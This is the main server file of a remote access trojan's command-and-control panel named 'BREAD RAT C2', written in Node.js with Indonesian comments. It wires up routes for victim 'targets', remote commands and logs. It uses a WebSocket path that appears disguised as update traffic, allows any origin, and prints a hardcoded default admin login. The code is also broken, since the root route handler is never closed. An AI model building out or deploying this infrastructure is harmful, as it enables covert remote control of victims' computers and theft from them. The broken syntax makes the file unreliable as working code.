// ================================================================
// BREAD RAT C2 - SERVER UTAMA (MODULAR)
// ================================================================
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { initDatabase } = require('./routes/db');
const authRoutes = require('./routes/auth');
const targetsRoutes = require('./routes/targets');
const commandsRoutes = require('./routes/commands');
const logsRoutes = require('./routes/logs');
const { socketHandler } = require('./socket/handler');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*' },
    path: '/socket.io/update'
});

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Routes
app.use('/api/auth', authRoutes);
console.log('✅ Auth middleware registered');
app.use('/api/targets', targetsRoutes);
app.use('/api/commands', commandsRoutes);
app.use('/api/logs', logsRoutes);

// Root route untuk testing
app.get('/', (req, res) => {
    res.send('🍞 BREAD RAT C2 is running!');

app.get('/test', (req, res) => {
    res.json({ status: 'ok', message: 'Test route works' });
});

// WebSocket
socketHandler(io);

// Database initialization
(async () => {
    await initDatabase();
    const PORT = process.env.PORT || 3000;
    server.listen(PORT, '0.0.0.0', () => {
        console.log(`🍞 BREAD RAT C2 running on port ${PORT}`);
        console.log(`📡 WebSocket path: /socket.io/update`);
        console.log(`👤 Default login: admin / BreadRAT2025!`);
    });
})();

// Error handling
process.on('uncaughtException', (e) => console.error('Uncaught:', e));
process.on('unhandledRejection', (e) => console.error('Rejection:', e));
